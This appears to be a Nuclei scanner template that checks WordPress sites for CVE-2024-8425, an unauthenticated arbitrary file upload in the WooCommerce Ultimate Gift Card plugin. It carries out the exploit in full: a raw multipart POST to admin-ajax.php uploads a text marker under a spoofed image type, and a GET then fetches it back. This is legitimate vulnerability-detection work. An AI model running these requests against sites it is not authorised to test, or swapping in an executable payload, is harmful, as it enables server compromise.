id: CVE-2024-8425

info:
  name: WooCommerce Ultimate Gift Card â‰¤ 2.6.0 - Arbitrary File Upload
  author: jsnv-dev
  severity: critical
  description: |
    The WooCommerce Ultimate Gift Card plugin for WordPress is vulnerable to arbitrary file uploads 
    due to insufficient file type validation in the 'mwb_wgm_preview_mail' and 'mwb_wgm_woocommerce_add_cart_item_data' 
    functions in all versions up to, and including, 2.6.0. This makes it possible for unauthenticated 
    attackers to upload arbitrary files on the affected site's server which may make remote code execution possible.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8425
    - https://nvd.nist.gov/vuln/detail/CVE-2024-8425
    - https://github.com/KTN1990/CVE-2024-8425
    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/woocommerce-ultimate-gift-card/woocommerce-ultimate-gift-card-260-unauthenticated-arbitrary-file-upload
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-8425
    cwe-id: CWE-434
  metadata:
    verified: true
    max-request: 2
  tags: cve,cve2024,wordpress,woocommerce,fileupload

variables:
  test_filename: "test-{{rand_int(10000,99999)}}.txt"
  test_content: "CVE-2024-8425-VERIFICATION-{{rand_int(1000,9999)}}"
  boundary_id: "{{rand_int(100000,999999)}}"

flow: http(1) && http(2)

http:
  - raw:
      - |
        POST /wp-admin/admin-ajax.php?action=mwb_wgm_preview_mail HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{boundary_id}}
        
        ------WebKitFormBoundary{{boundary_id}}
        Content-Disposition: form-data; name="mwb_wgm_preview_email"
        
        test
        ------WebKitFormBoundary{{boundary_id}}
        Content-Disposition: form-data; name="tempId"
        
        1
        ------WebKitFormBoundary{{boundary_id}}
        Content-Disposition: form-data; name="message"
        
        security test
        ------WebKitFormBoundary{{boundary_id}}
        Content-Disposition: form-data; name="file"; filename="{{test_filename}}"
        Content-Type: image/jpeg
        
        {{test_content}}
        ------WebKitFormBoundary{{boundary_id}}--

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
        internal: true

      - type: word
        words:
          - "name={{test_filename}}"
        part: body
        internal: true

  - raw:
      - |
        GET /wp-content/uploads/mwb_browse/{{test_filename}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
        internal: true

      - type: word
        words:
          - "{{test_content}}"
        part: body

    extractors:
      - type: kval
        kval:
          - test_content
